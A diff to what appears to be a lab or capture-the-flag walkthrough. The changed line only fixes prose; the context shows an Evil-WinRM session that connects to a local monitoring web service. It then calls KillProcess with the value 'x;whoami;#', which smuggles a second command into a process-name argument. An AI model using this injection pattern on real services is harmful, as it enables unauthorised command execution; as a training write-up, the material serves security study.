@@ -624,7 +624,7 @@ So for some reason this is not working over the tunnel i have on ligolo, so ill 
 *Evil-WinRM* PS C:\Software\Monitoring> $client = New-WebServiceProxy -Uri http://localhost:8000/MonitorService?wsdl -Namespace "WcfProxy"
 ```
 
-First ill make a variable and set the uri to the correct endpoint, this command basically allow
+First ill make a variable and set the uri to the correct endpoint, this command basically allows me to communicate with the service 
 
 ```python
 *Evil-WinRM* PS C:\Software\Monitoring> $client.KillProcess("x;whoami;#")
